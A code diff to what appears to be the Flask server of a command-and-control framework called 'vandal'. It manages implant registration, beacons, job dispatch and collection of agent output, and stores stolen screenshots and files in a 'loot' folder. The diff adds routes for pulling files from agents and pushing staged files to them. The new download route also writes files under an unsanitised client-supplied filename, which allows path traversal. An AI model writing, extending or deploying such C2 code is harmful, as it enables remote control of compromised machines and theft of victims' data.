@@ -1,12 +1,16 @@
 from vandal_settings import PORT, SECRET_KEY
-from flask import Flask,app,request,jsonify
+from flask import Flask, abort,app,request,jsonify, send_file, send_from_directory
 from colorama import init, Fore
 from prettytable import PrettyTable
 import requests,base64,datetime
 from .__agents import list_agents
 from .__menu import *
+from .__sockets import *
 
 chunks = {}
+proxy_statuses = {}
+LOOT_FOLDER = './loot'  # Adjust as needed
+TRANSFER_FOLDER = './transfer'  # Adjust as needed
 
 def initialize_routes(app):
     @app.route('/tag', methods=['POST'])
@@ -22,7 +26,7 @@ def initialize_routes(app):
                 'X-Secret-Key': received_key
             }
             # This line needs to be updated with argument passed in server, else default value
-            response = requests.post(f'https://127.0.0.1:{PORT}/tag', json=request.json, headers=headers, verify=False)
+            response = requests.post(f'http://127.0.0.1:{PORT}/tag', json=request.json, headers=headers, verify=False)
 
             # If the registration was successful, print the agent details
             # Would like to move this to a table format 
@@ -50,7 +54,7 @@ def initialize_routes(app):
             headers = {'X-Secret-Key': received_key,
                        'X-Agent-ID' : agent_identifier,
                        'X-Sleep-Duration' : sleep_duration }
-            response = requests.get(f'https://127.0.0.1:{PORT}/beat', headers=headers, verify=False)  # Adjust endpoint if necessary
+            response = requests.get(f'http://127.0.0.1:{PORT}/beat', headers=headers, verify=False)  # Adjust endpoint if necessary
             return response.content, response.status_code
         else:
             return "Not Authenticated", 401
@@ -63,7 +67,7 @@ def initialize_routes(app):
         }
 
         # Since the server is hosting the endpoints we need to forward the request
-        response = requests.get(f"https://127.0.0.1:{PORT}/jobs/{agent_id}", headers=headers, verify=False)
+        response = requests.get(f"http://127.0.0.1:{PORT}/jobs/{agent_id}", headers=headers, verify=False)
 
         return response.content, response.status_code, dict(response.headers)
 
@@ -81,7 +85,7 @@ def initialize_routes(app):
         output = data.get('output')
         # This is where things get interesting
         # This flag will be None if not present
-        is_final_chunk = data.get('is_final_chunk', None)  
+        is_final_chunk = data.get('is_final_chunk', None) 
 
         # Handle Linux screenshot 
         if 'screenshot' in data:
@@ -110,7 +114,7 @@ def initialize_routes(app):
                 #print("Assembled data:", complete_data)
                 img_data = base64.b64decode(complete_data)
                 current_time = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-                filename = f"loot/data_{job_id}_{current_time}.png"
+                filename = f"loot/data_{job_id}_{current_time}.file"
                 with open(filename, 'wb') as f:
                     f.write(img_data)
                 # Wipe the chunks for this job    
@@ -131,3 +135,49 @@ def initialize_routes(app):
             raise RuntimeError('Not running the development server')
         shutdown_server()
         return 'Server shutting down...'
+
+        
+    @app.route('/download_file', methods=['POST'])
+    def download_file():
+        try:
+            raw_data = request.data
+            # Here, we'll assume you sent the filename as a header (X-Filename). Adjust as needed.
+            filename = request.headers.get('X-Filename')
+            if not filename:
+                raise ValueError("Filename not provided")
+
+            save_path = os.path.join(LOOT_FOLDER, filename)
+            with open(save_path, 'wb') as f:
+                f.write(raw_data)
+        
+            return jsonify({'message': 'File downloaded successfully!'}), 200
+        except Exception as e:
+            return jsonify({'error': str(e)}), 400
+        
+
+    from werkzeug.utils import secure_filename
+
+    @app.route('/upload_file/<filename>', methods=['GET'])
+    def upload_file(filename):
+        try:
+            safe_filename = secure_filename(filename)
+            absolute_path = os.path.abspath(os.path.join(TRANSFER_FOLDER, safe_filename))
+
+            # Print or log for debugging
+            print(f"Requested filename: {filename}")
+            print(f"Absolute path to serve: {absolute_path}")
+
+            # Check if file exists before trying to send it
+            if not os.path.exists(absolute_path):
+                return jsonify({'error': 'File not found'}), 404
+
+            return send_file(absolute_path, as_attachment=True, download_name=safe_filename)
+        except Exception as e:
+            print(f"Server Error: {str(e)}")  # Print or log the error
+            return jsonify({'error': str(e)}), 500
+
+
+
+
+
+
